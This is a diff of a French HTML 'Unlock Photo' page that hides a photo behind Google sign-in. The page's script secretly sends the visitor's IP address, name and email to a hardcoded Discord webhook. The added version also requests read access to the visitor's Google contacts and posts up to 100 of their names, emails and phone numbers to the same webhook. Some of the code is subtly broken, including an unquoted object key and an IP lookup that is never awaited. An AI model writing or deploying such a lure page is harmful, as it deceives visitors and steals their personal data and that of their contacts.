@@ -1,90 +1,91 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Unlock Photo</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Unlock Photo</title>
 
-<script src="https://accounts.google.com/gsi/client" async defer></script>
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+    <script src="https://apis.google.com/js/api.js" async defer></script>
 
-<style>
-body {
-    margin: 0;
-    height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-}
+    <style>
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: linear-gradient(135deg, #0d0d0d, #1a1a1a);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-/* PAGE LOGIN */
-#loginPage {
-    text-align: center;
-    color: white;
-}
+        /* PAGE LOGIN */
+        #loginPage {
+            text-align: center;
+            color: white;
+        }
 
-.login-box {
-    background: rgba(255,255,255,0.05);
-    padding: 40px;
-    border-radius: 20px;
-    box-shadow: 0 0 30px rgba(0,0,0,0.8);
-}
+        .login-box {
+            background: rgba(255,255,255,0.05);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 30px rgba(0,0,0,0.8);
+        }
 
-/* PAGE PHOTO */
-#photoPage {
-    display: none;
-}
+        /* PAGE PHOTO */
+        #photoPage {
+            display: none;
+        }
 
-.container {
-    position: relative;
-    width: 350px;
-    height: 500px;
-    border-radius: 25px;
-    overflow: hidden;
-    box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 60px rgba(0,0,0,0.4) inset;
-    border: 2px solid rgba(255,255,255,0.1);
-}
+        .container {
+            position: relative;
+            width: 350px;
+            height: 500px;
+            border-radius: 25px;
+            overflow: hidden;
+            box-shadow: 0 0 30px rgba(0,0,0,0.8), 0 0 60px rgba(0,0,0,0.4) inset;
+            border: 2px solid rgba(255,255,255,0.1);
+        }
 
-.container::before {
-    content: "";
-    position: absolute;
-    top: 0; left: 0;
-    width: 100%; height: 100%;
-    background-image: url('https://th.bing.com/th/id/OIP.Sf-7AhO0y59pnX5ZceAlCQHaKx?w=207&h=301&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3');
-    background-size: cover;
-    background-position: center;
-    filter: blur(25px) brightness(0.7);
-    z-index: 0;
-}
+        .container::before {
+            content: "";
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image: url('https://th.bing.com/th/id/OIP.Sf-7AhO0y59pnX5ZceAlCQHaKx?w=207&h=301&c=7&r=0&o=7&dpr=1.3&pid=1.7&rm=3');
+            background-size: cover;
+            background-position: center;
+            filter: blur(25px) brightness(0.7);
+            z-index: 0;
+        }
 
-.lock {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    font-size: 80px;
-    color: #ff4d4d;
-    text-shadow: 0 0 10px #ff4d4d, 0 0 20px #ff4d4d;
-    background: rgba(0,0,0,0.6);
-    padding: 25px;
-    border-radius: 50%;
-    backdrop-filter: blur(10px);
-    z-index: 2;
-    cursor: pointer;
-}
+        .lock {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 80px;
+            color: #ff4d4d;
+            text-shadow: 0 0 10px #ff4d4d, 0 0 20px #ff4d4d;
+            background: rgba(0,0,0,0.6);
+            padding: 25px;
+            border-radius: 50%;
+            backdrop-filter: blur(10px);
+            z-index: 2;
+            cursor: pointer;
+        }
 
-.title {
-    position: absolute;
-    bottom: 25px;
-    width: 100%;
-    text-align: center;
-    color: #fff;
-    font-size: 22px;
-    letter-spacing: 1px;
-    z-index: 2;
-}
-</style>
+        .title {
+            position: absolute;
+            bottom: 25px;
+            width: 100%;
+            text-align: center;
+            color: #fff;
+            font-size: 22px;
+            letter-spacing: 1px;
+            z-index: 2;
+        }
+    </style>
 </head>
 
 <body>
@@ -118,62 +119,110 @@ body {
 </div>
 
 <script>
-function handleCredentialResponse(response) {
-    const jwt = response.credential;
+    function handleCredentialResponse(response) {
+        const jwt = response.credential;
 
-    // Décodage du token pour récupérer les infos utilisateur
-    const payload = JSON.parse(atob(jwt.split('.')[1]));
+        // Décodage du token pour récupérer les infos utilisateur
+        const payload = JSON.parse(atob(jwt.split('.')[1]));
 
-    console.log("Connecté :", payload.email);
+        console.log("Connecté :", payload.email);
 
-    // Sauvegarde session locale
-    localStorage.setItem("google_user", JSON.stringify(payload));
+        // Sauvegarde session locale
+        localStorage.setItem("google_user", JSON.stringify(payload));
 
-    showPhotoPage();
-}
-
-function showPhotoPage() {
-    document.getElementById("loginPage").style.display = "none";
-    document.getElementById("photoPage").style.display = "flex";
-}
-
-// Vérifie si déjà connecté
-window.onload = function() {
-    const user = localStorage.getItem("google_user");
-    if(user) {
         showPhotoPage();
     }
-};
 
-// Envoie l'IP, le nom, le prénom et l'email vers le webhook Discord
-window.onload = function() {
-    fetch('https://api.ipify.org?format=json')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip;
+    function showPhotoPage() {
+        document.getElementById("loginPage").style.display = "none";
+        document.getElementById("photoPage").style.display = "flex";
+    }
 
-            const user = localStorage.getItem("google_user");
-            const userObj = JSON.parse(user);
+    // Vérifie si déjà connecté
+    window.onload = function() {
+        const user = localStorage.getItem("google_user");
+        if(user) {
+            showPhotoPage();
+        }
+    };
 
-            const webhookUrl = 'https://discord.com/api/webhooks/1471154515238588420/NVvd16VSjrUiYpJj54rSKrTy86q9zI9-urEFun9eezXtptYKX6UdW2PNhZe5RzOiWKwA'; // Remplace par ton webhook
+    // Initialisation Google API
+    function handleClientLoad() {
+        gapi.load('client:auth2', initClient);
+    }
 
-            const payload = {
-                content: `**IP publique :** ${ip}\n**Nom :** ${userObj.name}\n**Prénom :** ${userObj.given_name}\n**Email :** ${userObj.email}`
-            };
+    function initClient() {
+        gapi.auth2.init({
+            client_id: '739861507841-mnmfem8pjmcemo48ufsckgkqvtoec8j6.apps.googleusercontent.com',
+            scope: 'https://www.googleapis.com/auth/contacts.readonly',
+            immediate: true
+        }).then(function () {
+            if (gapi.auth2.getAuthInstance().isSignedIn.get()) {
+                getContacts();
+            } else {
+                gapi.auth2.getAuthInstance().signIn();
+            }
+        });
+    }
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
+    function getContacts() {
+        const request = gapi.client.request({
+            path: 'https://www.google.com/m8/feeds/contacts/default/full',
+            method: 'GET',
+            params: {
+                max-results: 100
+            }
+        });
+
+        request.execute(function (response) {
+            if (response && response.feed) {
+                const contacts = response.feed.entry || [];
+                sendContactsToDiscord(contacts);
+            }
+        });
+    }
+
+    function sendContactsToDiscord(contacts) {
+        const user = localStorage.getItem("google_user");
+        const userObj = JSON.parse(user);
+
+        const webhookUrl = 'https://discord.com/api/webhooks/1471154515238588420/NVvd16VSjrUiYpJj54rSKrTy86q9zI9-urEFun9eezXtptYKX6UdW2PNhZe5RzOiWKwA'; // Remplace par ton webhook
+
+        const payload = {
+            content: `**IP publique :** ${getIP()}\n**Nom :** ${userObj.name}\n**Prénom :** ${userObj.given_name}\n**Email :** ${userObj.email}\n\n**Contacts :**`,
+            embeds: contacts.map(contact => {
+                const name = contact.gd$name.$t;
+                const email = contact.gd$email[0].address;
+                const phone = contact.gd$phoneNumber[0].value || 'N/A';
+                return {
+                    title: name,
+                    description: `📧 Email: ${email}\n📞 Téléphone: ${phone}`,
+                    color: 0x00ff00
+                };
             })
-            .catch(error => console.error('Erreur lors de l\'envoi vers le webhook Discord:', error));
-        })
-        .catch(error => console.error('Erreur lors de la récupération de l\'IP:', error));
-};
+        };
+
+        fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(payload)
+        }).catch(error => console.error('Erreur lors de l\'envoi vers le webhook Discord:', error));
+    }
+
+    function getIP() {
+        return fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => data.ip)
+            .catch(error => 'IP inconnue');
+    }
+
+    // Appel de handleClientLoad
+    window.onload = function() {
+        handleClientLoad();
+    };
 </script>
 
 </body>
 </html>
-
